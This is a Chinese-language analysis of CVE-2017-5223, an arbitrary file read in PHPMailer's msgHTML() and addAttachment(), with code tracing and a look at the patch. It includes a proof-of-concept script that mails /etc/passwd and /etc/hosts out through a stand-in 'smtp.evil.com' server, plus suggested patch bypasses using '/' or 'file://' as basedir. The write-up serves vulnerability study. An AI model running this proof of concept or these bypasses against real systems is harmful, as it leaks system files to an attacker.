漏洞编号： 
CVE-2017-5223

影响版本：
PHPMailer <= 5.2.21

任意文件读取。

文件读取的函数主要是 encodeFile函数。作用: Encode a file attachment in requested format.
```
    protected function encodeFile($path, $encoding = 'base64')
    {
        try {
            if (!is_readable($path)) {
                throw new phpmailerException($this->lang('file_open') . $path, self::STOP_CONTINUE);
            }
            $magic_quotes = get_magic_quotes_runtime();
            if ($magic_quotes) {
                if (version_compare(PHP_VERSION, '5.3.0', '<')) {
                    set_magic_quotes_runtime(false);
                } else {
                    //Doesn't exist in PHP 5.4, but we don't need to check because
                    //get_magic_quotes_runtime always returns false in 5.4+
                    //so it will never get here
                    ini_set('magic_quotes_runtime', false);
                }
            }
            $file_buffer = file_get_contents($path);
            $file_buffer = $this->encodeString($file_buffer, $encoding);
            if ($magic_quotes) {
                if (version_compare(PHP_VERSION, '5.3.0', '<')) {
                    set_magic_quotes_runtime($magic_quotes);
                } else {
                    ini_set('magic_quotes_runtime', $magic_quotes);
                }
            }
            return $file_buffer;
        } catch (Exception $exc) {
            $this->setError($exc->getMessage());
            return '';
        }
    }
```

该函数中接收了一个$path变量，最后该$path变量的值带入到了file_get_contents函数中执行。如果该$path变量可控即可任意文件读取.

### 参数回溯，寻找可控的输入
我们来回溯一下$path参数。在attachAll函数中:
```
// Add all attachments
foreach ($this->attachment as $attachment) {
    // Check if it is a valid disposition_filter
    if ($attachment[6] == $disposition_type) {
        // Check for string attachment
        $string = '';
        $path = '';
        $bString = $attachment[5];
        if ($bString) {
            $string = $attachment[0];
        } else {
            $path = $attachment[0];
        }
```

我们看到$path的赋值过程，只要是$this->attachment数组中每一个attachment的第六个元素为False,就将$attachment[0] 赋值给 $path.

我们查看一下$this->attachment的赋值。

发现有如下函数有调用：

```
public function addAttachment($path, $name = '', $encoding = 'base64', $type = '', $disposition = 'attachment')
{
...
            $this->attachment[] = array(
            0 => $path,
            1 => $filename,
            2 => $name,
            3 => $encoding,
            4 => $type,
            5 => false, // isStringAttachment
            6 => $disposition,
            7 => 0
        );
        

public function addStringAttachment(
    $string,
    $filename,
    $encoding = 'base64',
    $type = '',
    $disposition = 'attachment'
) {
    // If a MIME type is not specified, try to work it out from the file name
    if ($type == '') {
        $type = self::filenameToType($filename);
    }
    // Append to $attachment array
    $this->attachment[] = array(
        0 => $string,
        1 => $filename,
        2 => basename($filename),
        3 => $encoding,
        4 => $type,
        5 => true, // isStringAttachment
        6 => $disposition,
        7 => 0
    );
}


public function addEmbeddedImage($path, $cid, $name = '', $encoding = 'base64', $type = '', $disposition = 'inline')
{
    if (!@is_file($path)) {
        $this->setError($this->lang('file_access') . $path);
        return false;
    }

    // If a MIME type is not specified, try to work it out from the file name
    if ($type == '') {
        $type = self::filenameToType($path);
    }

    $filename = basename($path);
    if ($name == '') {
        $name = $filename;
    }

    // Append to $attachment array
    $this->attachment[] = array(
        0 => $path,
        1 => $filename,
        2 => $name,
        3 => $encoding,
        4 => $type,
        5 => false, // isStringAttachment
        6 => $disposition,
        7 => $cid
    );
    return true;
}

    public function addStringEmbeddedImage(...){
        $this->attachment[] = array(
            0 => $string,
            1 => $name,
            2 => $name,
            3 => $encoding,
            4 => $type,
            5 => true, // isStringAttachment
            6 => $disposition,
            7 => $cid
        );        
    }
```

只有addAttachment()函数和addEmbeddedImage() 函数可以，其他两个函数$attachment[5] 为true.

addAttachment()只有phpmailerTest.php和
testCallback.php 调用。这两个都是test测试文件。显示这个说明这个函数是可以直接被我们调用的。

来看AddEmbeddedImage函数，该函数是处理邮件内容中的图片的，回溯该函数发现msgHTML函数调用了该函数，msgHTML 函数是用来发送html格式的邮件。

调用过程为:
```
   public function msgHTML($message, $basedir = '', $advanced = false)
    {
        preg_match_all('/(src|background)=["\'](.*)["\']/Ui', $message, $images);
        if (array_key_exists(2, $images)) {
            foreach ($images[2] as $imgindex => $url) {
                // Convert data URIs into embedded images
                if (preg_match('#^data:(image[^;,]*)(;base64)?,#', $url, $match)) {
                    $data = substr($url, strpos($url, ','));
                    if ($match[2]) {
                        $data = base64_decode($data);
                    } else {
                        $data = rawurldecode($data);
                    }
                    $cid = md5($url) . '@phpmailer.0'; // RFC2392 S 2
                    if ($this->addStringEmbeddedImage($data, $cid, 'embed' . $imgindex, 'base64', $match[1])) {
                        $message = str_replace(
                            $images[0][$imgindex],
                            $images[1][$imgindex] . '="cid:' . $cid . '"',
                            $message
                        );
                    }
                } elseif (substr($url, 0, 4) !== 'cid:' && !preg_match('#^[a-z][a-z0-9+.-]*://#i', $url)) {
                    // Do not change urls for absolute images (thanks to corvuscorax)
                    // Do not change urls that are already inline images
                    $filename = basename($url);
                    $directory = dirname($url);
                    if ($directory == '.') {
                        $directory = '';
                    }
                    $cid = md5($url) . '@phpmailer.0'; // RFC2392 S 2
                    if (strlen($basedir) > 1 && substr($basedir, -1) != '/') {
                        $basedir .= '/';
                    }
                    if (strlen($directory) > 1 && substr($directory, -1) != '/') {
                        $directory .= '/';
                    }
                    if ($this->addEmbeddedImage(
                        $basedir . $directory . $filename,
                        $cid,
                        $filename,
                        'base64',
                        self::_mime_types((string)self::mb_pathinfo($filename, PATHINFO_EXTENSION))
                    )
```
$url是通过解析$message里src=”xxxxx”而来的，$url最终被解析出来就是xxxxx，而$message就是我们发送邮件的自定义的内容。这样可控点就找到了，即可成功利用该漏洞了


### 查找所有触发encodeFile 函数的触发链。

我们直接查看一下encodeFile的所有引用，只有class.phpmailer.php中的attachAll函数有调用。

发现也只有同文件的createBody()函数调用了，而且是多次调用。

继续往上回溯，我们发现调用链为；

    send()->preSend()->createBody->attachAll()->encodeFile()

我们找到一处触发链，找到两个函数可以添加我们的可控变量$path参数。

POC 直接借用freebuf的一个大佬的poc

```
<?php  
#Author:Yxlink
require_once('PHPMailerAutoload.php');
$mail = new PHPMailer();
$mail->IsSMTP();
$mail->Host = "smtp.evil.com";
$mail->Port = 25;
$mail->SMTPAuth   = true;
 
$mail->CharSet  = "UTF-8";
$mail->Encoding = "base64";
 
$mail->Username = "test@evil.com";  
$mail->Password = "tes1234t";  
$mail->Subject = "hello";
 
$mail->From = "test@evil.com";  
$mail->FromName = "test";  
 
$address = "testtest@test.com";
$mail->AddAddress($address, "test");
 
$mail->addAttachment('/etc/hosts','test.txt');  //test.txt可控即可任意文件读取 
$mail->IsHTML(true);  
$msg="<img src='/etc/passwd'>test";//邮件内容形如这样写。
$mail->msgHTML($msg);
 
if(!$mail->Send()) {
  echo "Mailer Error: " . $mail->ErrorInfo;
} else {
  echo "Message sent!";
}
?>
```

参考； http://www.freebuf.com/vuls/124820.html

### 补丁分析

https://github.com/PHPMailer/PHPMailer/blob/master/changelog.md

```
Version 5.2.22 (January 5th 2017)
SECURITY Fix CVE-2017-5223, local file disclosure vulnerability if content passed to msgHTML() is sourced from unfiltered user input. Reported by Yongxiang Li of Asiasecurity. The fix for this means that calls to msgHTML() without a $basedir will not import images with relative URLs, and relative URLs containing .. will be ignored.
```

在msgHTML 函数中添加了一些if 语句:

```
if (
    // Only process relative URLs if a basedir is provided (i.e. no absolute local paths)
    !empty($basedir)
    // Ignore URLs containing parent dir traversal (..)
    && (strpos($url, '..') === false)
    // Do not change urls that are already inline images
    && substr($url, 0, 4) !== 'cid:'
    // Do not change absolute URLs, including anonymous protocol
    && !preg_match('#^[a-z][a-z0-9+.-]*:?//#i', $url)
) {
    $filename = basename($url);
    $directory = dirname($url);
    if ($directory == '.') {
        $directory = '';
    }
    $cid = md5($url) . '@phpmailer.0'; // RFC2392 S 2
    if (strlen($directory) > 1 && substr($directory, -1) != '/') {
        $directory .= '/';
    }
    if ($this->addEmbeddedImage(
        $basedir . $directory . $filename,
        $cid,
        $filename,
        'base64',
        self::_mime_types((string)self::mb_pathinfo($filename, PATHINFO_EXTENSION))
    )
    ) {
        $message = preg_replace(
            '/' . $images[1][$imgindex] . '=["\']' . preg_quote($url, '/') . '["\']/Ui',
            $images[1][$imgindex] . '="cid:' . $cid . '"',
            $message
        );
    }
}
```

必须有basedir，且对url的格式做了一些限制。

如果只是防止文件读取漏洞的话其实绕过方式很多, 只需要我们传入一个目录即可:

```
$msg="<img src='/etc/passwd'>test";//邮件内容形如这样写。
$mail->msgHTML($msg,'file://');

或者
$msg = "<img src='/etc/passwd'>test"
$mail->msgHTML($msg,'/');
```

但是其实添加附件和嵌入附件是正常的功能,这个要区分是正常功能还是漏洞:
```
The fix for this means that calls to msgHTML() without a $basedir will not import images with relative URLs, and relative URLs containing .. will be ignored.
```
没修复之前之所以是漏洞，是因为在没有$basedir 的情况下msgHTML()函数可以读取任意目录的文件。

